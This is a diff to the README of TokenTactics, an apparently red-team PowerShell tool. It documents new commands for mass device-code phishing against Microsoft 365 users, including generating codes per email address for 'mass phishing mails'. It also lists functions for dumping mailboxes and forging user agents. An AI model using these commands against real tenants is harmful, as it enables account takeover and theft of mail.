@@ -15,7 +15,9 @@ You may also use these tokens with [AAD Internals](https://o365blog.com/aadinter
 
 ```Import-Module .\TokenTactics.psd1```
 
-```Get-Help Get-Azure-Token```
+```Get-Help Get-AzureToken```
+
+```Get-Help Get-AzureTokenMulti```
 
 ```RefreshTo-SubstrateToken```
 
@@ -26,6 +28,12 @@ Once the user has logged in, you'll be presented with the JWT and it will be sav
 
 #### DOD/Mil Device Code
 ```Get-AzureToken -Client DODMSGraph```
+
+#### Multithreaded Device Code Generation
+Generate 50 Device Codes and start 50 separate threads which will poll the status of the codes on a 5 second interval.
+```Get-AzureTokenMulti -Client MSGraph -Count 50```
+Generate a device code for each email address in the emails.txt file, and save the device codes in a DeviceCodes.csv file which can be imported in a different tool to send mass phishing mails.
+```Get-AzureTokenMulti -Client MSGraph -InputFile .\emails.txt -CodeFile DeviceCodes.csv```
 
 ### Refresh or Switch Tokens
 
@@ -49,6 +57,7 @@ Function        Clear-Token                                        0.0.1      To
 Function        Dump-OWAMailboxViaMSGraphApi                       0.0.1      TokenTactics
 Function        Forge-UserAgent                                    0.0.1      TokenTactics
 Function        Get-AzureToken                                     0.0.1      TokenTactics
+Function        Get-AzureTokenMulti                                0.0.1      TokenTactics
 Function        Get-TenantID                                       0.0.1      TokenTactics
 Function        Open-OWAMailboxInBrowser                           0.0.1      TokenTactics
 Function        Parse-JWTtoken                                     0.0.1      TokenTactics
@@ -65,7 +74,7 @@ Function        RefreshTo-OfficeAppsToken                          0.0.1      To
 Function        RefreshTo-OfficeManagementToken                    0.0.1      TokenTactics
 Function        RefreshTo-OutlookToken                             0.0.1      TokenTactics
 Function        RefreshTo-SubstrateToken                           0.0.1      TokenTactics
-Function        RefreshTo-YammerToken                           0.0.1      TokenTactics
+Function        RefreshTo-YammerToken                              0.0.1      TokenTactics
 ```
 
 ## Authors and contributors
